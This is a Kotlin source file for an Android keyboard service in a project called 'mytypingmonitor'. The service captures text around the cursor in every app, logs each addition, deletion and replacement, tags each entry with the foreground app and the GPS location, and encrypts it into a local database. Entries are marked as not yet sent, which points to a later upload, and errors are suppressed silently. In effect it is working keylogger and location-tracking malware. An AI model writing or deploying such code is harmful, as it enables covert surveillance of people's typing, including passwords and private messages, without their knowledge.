package com.mytypingmonitor.ime

import android.inputmethodservice.InputMethodService
import android.view.View
import android.view.inputmethod.EditorInfo
import android.view.inputmethod.InputConnection
import com.mytypingmonitor.db.AppDatabase
import com.mytypingmonitor.db.TypingLogEntity
import com.mytypingmonitor.location.LocationHelper
import com.mytypingmonitor.crypto.CryptoHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import android.content.Context
import android.os.Build
import android.app.ActivityManager
import android.app.usage.UsageStatsManager
import com.mytypingmonitor.R

class MyKeyboardService : InputMethodService() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var database: AppDatabase
    private lateinit var locationHelper: LocationHelper
    private lateinit var cryptoHelper: CryptoHelper
    private var currentAppPackage: String = "unknown"
    private var lastSelectionStart: Int = 0
    private var lastSelectionEnd: Int = 0
    private var lastText: String = ""

    override fun onCreate() {
        super.onCreate()
        database = AppDatabase.getDatabase(this)
        locationHelper = LocationHelper(this)
        cryptoHelper = CryptoHelper(this)
        updateCurrentApp()
    }

    private fun updateCurrentApp() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                val time = System.currentTimeMillis()
                val stats = usageStatsManager?.queryUsageStats(
                    UsageStatsManager.INTERVAL_BEST,
                    time - 1000 * 60,
                    time
                )
                if (stats != null && stats.isNotEmpty()) {
                    val mostRecent = stats.maxByOrNull { it.lastTimeUsed }
                    currentAppPackage = mostRecent?.packageName ?: "unknown"
                }
            } else {
                val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val tasks = am.getRunningTasks(1)
                if (tasks.isNotEmpty()) {
                    currentAppPackage = tasks[0].topActivity?.packageName ?: "unknown"
                }
            }
        } catch (e: Exception) {
            currentAppPackage = "unknown"
        }
    }

    override fun onCreateInputView(): View {
        return layoutInflater.inflate(R.layout.keyboard, null)
    }

    override fun onStartInputView(info: EditorInfo?, restarting: Boolean) {
        super.onStartInputView(info, restarting)
        updateCurrentApp()
        lastText = ""
        lastSelectionStart = 0
        lastSelectionEnd = 0
    }

    override fun onUpdateSelection(
        oldSelStart: Int,
        oldSelEnd: Int,
        newSelStart: Int,
        newSelEnd: Int,
        candidatesStart: Int,
        candidatesEnd: Int
    ) {
        super.onUpdateSelection(oldSelStart, oldSelEnd, newSelStart, newSelEnd, candidatesStart, candidatesEnd)
        
        val inputConnection = currentInputConnection ?: return
        
        // Get current text around cursor
        val textBeforeCursor = inputConnection.getTextBeforeCursor(1000, 0)?.toString() ?: ""
        val textAfterCursor = inputConnection.getTextAfterCursor(1000, 0)?.toString() ?: ""
        val currentText = textBeforeCursor + textAfterCursor
        
        // Detect text changes
        if (lastText.isNotEmpty() && currentText != lastText) {
            val oldLength = lastText.length
            val newLength = currentText.length
            
            when {
                // Text was added
                newLength > oldLength -> {
                    val addedText = if (newSelStart > 0 && newSelStart <= currentText.length) {
                        val start = maxOf(0, newSelStart - (newLength - oldLength))
                        currentText.substring(start, newSelStart)
                    } else {
                        currentText.substring(oldLength)
                    }
                    if (addedText.isNotEmpty()) {
                        logText(addedText)
                    }
                }
                // Text was deleted
                newLength < oldLength -> {
                    logText("[BACKSPACE]")
                }
                // Text was replaced
                else -> {
                    logText("[REPLACE]")
                }
            }
        }
        
        lastText = currentText
        lastSelectionStart = newSelStart
        lastSelectionEnd = newSelEnd
    }

    private fun logText(text: String) {
        scope.launch {
            try {
                updateCurrentApp()
                val (latitude, longitude) = locationHelper.getCurrentLocation()
                
                val encryptedText = cryptoHelper.encrypt(text)
                
                val log = TypingLogEntity(
                    text = encryptedText,
                    appPackage = currentAppPackage,
                    timestamp = System.currentTimeMillis(),
                    latitude = latitude,
                    longitude = longitude,
                    isSent = false
                )
                
                database.typingLogDao().insertLog(log)
            } catch (e: Exception) {
                // Log error silently
            }
        }
    }
}

